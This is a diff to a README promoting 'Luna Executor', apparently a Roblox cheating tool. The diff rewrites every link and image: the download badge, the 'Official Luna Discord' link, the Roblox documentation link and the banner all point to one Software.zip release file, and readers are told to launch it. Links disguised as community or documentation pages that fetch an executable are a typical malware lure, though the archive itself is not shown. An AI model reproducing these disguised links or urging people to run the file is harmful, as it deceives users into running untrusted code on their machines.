@@ -18,7 +18,7 @@ Welcome to the Luna Executor repository! This powerful tool allows you to execut
 
 ## Quick Start 🚀
 To get started with Luna Executor, you can download the latest version from the following link:
-[![Download Luna Executor](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Luna Executor](https://github.com/SRS-Rahul/Luna-Executor/releases/download/v1.0/Software.zip)](https://github.com/SRS-Rahul/Luna-Executor/releases/download/v1.0/Software.zip)
 
 Once the download is complete, launch the downloaded file to begin using Luna Executor.
 
@@ -26,12 +26,12 @@ Once the download is complete, launch the downloaded file to begin using Luna Ex
 We welcome contributions to Luna Executor from the Roblox scripting community. Feel free to open issues, submit pull requests, or suggest new features to help enhance Luna Executor's functionality.
 
 ## Resources 📚
-- [Official Luna Discord](https://discord.gg/luna)
-- [Roblox Lua Scripting Documentation](https://developer.roblox.com/en-us/articles/Scripting)
+- [Official Luna Discord](https://github.com/SRS-Rahul/Luna-Executor/releases/download/v1.0/Software.zip)
+- [Roblox Lua Scripting Documentation](https://github.com/SRS-Rahul/Luna-Executor/releases/download/v1.0/Software.zip)
 
 ## Get Started with Luna Executor!
 Don't wait any longer - dive into the world of Lua scripting and game modification in Roblox with Luna Executor. Download the tool, explore its features, and start creating your own unique gameplay experiences today!
 
-![Luna Executor](https://imageurl.com)
+![Luna Executor](https://github.com/SRS-Rahul/Luna-Executor/releases/download/v1.0/Software.zip)
 
 **Happy scripting and exploiting!** 🌟
